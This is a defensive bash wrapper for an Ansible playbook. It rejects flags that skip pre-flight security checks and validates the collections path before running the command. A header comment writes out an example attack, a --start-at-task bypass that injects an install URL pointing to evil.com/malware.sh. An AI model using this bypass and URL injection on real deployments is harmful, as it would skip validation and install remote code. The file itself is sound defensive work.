#!/usr/bin/env bash
# SECURITY: Reject --start-at-task flag and other dangerous ansible-playbook flags
# to prevent bypassing pre-flight validation checks.
#
# Vulnerability: Ansible's --start-at-task skips pre_tasks (even with tags: [always]),
# allowing an attacker to bypass validation by running:
#   ansible-playbook site.yml --start-at-task '<task-name>' -e 'claude_install_url=https://evil.com/malware.sh'
#
# Defense-in-depth layers:
#   1. Makefile VERIFY_AND_RUN calls this script (Makefile layer — blocks direct users)
#   2. site.yml Play 0 has tags: [always] with pre-flight checks (Ansible layer)
#   3. site.yml Play 2 re-runs pre-flight checks (Ansible layer — survives --skip-tags always)
#   4. roles/claude/tasks/main.yml has no-tag defense-in-depth assertion (role layer)

set -euo pipefail

# Collect all command-line arguments after the script name
args=("$@")

# Reject specific dangerous flags only
# NOTE: --tags and --skip-tags are NOT blocked globally — they're needed for role-specific
# make targets (make claude, make system, etc.). Only --start-at-task and --skip-tags always
# are blocked, as they specifically bypass pre-flight security checks.
for arg in "${args[@]}"; do
    # Block --start-at-task: skips pre_tasks entirely, bypassing all Play 0 security checks
    if [[ "$arg" == '--start-at-task' || "$arg" == --start-at-task=* || "$arg" == '--start-task' ]]; then
        cat >&2 <<EOF
ERROR: --start-at-task rejected by VERIFY_AND_RUN
Reason: --start-at-task skips pre_tasks (even with tags: [always] on Play 0),
        allowing bypass of ALL 83+ security assertions in pre_flight_checks.yml.

SECURITY RISK: Enables attacker to inject malicious values via -e without validation.
Solution: Use a scoped make target instead (make claude, make packages, make ssh, etc.)
EOF
        exit 1
    fi
    # Block --skip-tags always: skips all [always]-tagged tasks including Play 0 assertions
    if [[ "$arg" == '--skip-tags=always' || "$arg" == '--skip-tags always' ]]; then
        cat >&2 <<EOF
ERROR: --skip-tags always rejected by VERIFY_AND_RUN
Reason: --skip-tags always skips Play 0 entirely, bypassing collection verification
        and all security assertions tagged [always] in pre_flight_checks.yml.
Solution: Do not use --skip-tags always with site.yml.
EOF
        exit 1
    fi
done

# Validate ANSIBLE_COLLECTIONS_PATH if set externally (prevents malicious path override)
# SECURITY: Validate directory boundaries to prevent path prefix collision attacks
if [[ -n "${ANSIBLE_COLLECTIONS_PATH:-}" ]]; then
    expected_dir="$(cd "$(dirname "$0")/.." && pwd)/collections"

    # Validate each colon-separated path component
    IFS=':' read -ra path_components <<<"${ANSIBLE_COLLECTIONS_PATH}"
    for path_component in "${path_components[@]}"; do
        # Skip empty components from leading/trailing colons
        [[ -z "$path_component" ]] && continue

        # Resolve the path to detect directory boundary violations
        if resolved_path="$(cd "$path_component" 2>/dev/null && pwd)"; then
            # Check if resolved path is exactly the collections dir or a subdirectory of it
            # This prevents prefix collision attacks like /home/user/collections-evil
            if [[ "$resolved_path" != "$expected_dir" && "$resolved_path" != "$expected_dir"/* ]]; then
                cat >&2 <<EOF
ERROR: ANSIBLE_COLLECTIONS_PATH contains unauthorized path component.
Expected: ${expected_dir} or subdirectories within it.
Got component: ${path_component} (resolved to: ${resolved_path})
This could load unverified collection code bypassing supply chain verification.
Solution: Unset ANSIBLE_COLLECTIONS_PATH or run via 'make' which sets it correctly.
EOF
                exit 1
            fi
        else
            cat >&2 <<EOF
ERROR: ANSIBLE_COLLECTIONS_PATH contains invalid path component.
Invalid path: ${path_component}
Solution: Unset ANSIBLE_COLLECTIONS_PATH or run via 'make' which sets it correctly.
EOF
            exit 1
        fi
    done
fi

# Verify collections integrity (defense-in-depth: supply chain verification)
scripts/verify-collections.sh

# All checks passed — exec the remaining arguments (ansible-playbook or molecule with its args).
# Using exec replaces this script's process with the command, preserving exit codes and
# signals. The Makefile uses: scripts/verify-ansible-args.sh ansible-playbook site.yml ...
# which passes the full command as $@.
if [[ ${#args[@]} -gt 0 ]]; then
    exec "${args[@]}"
fi
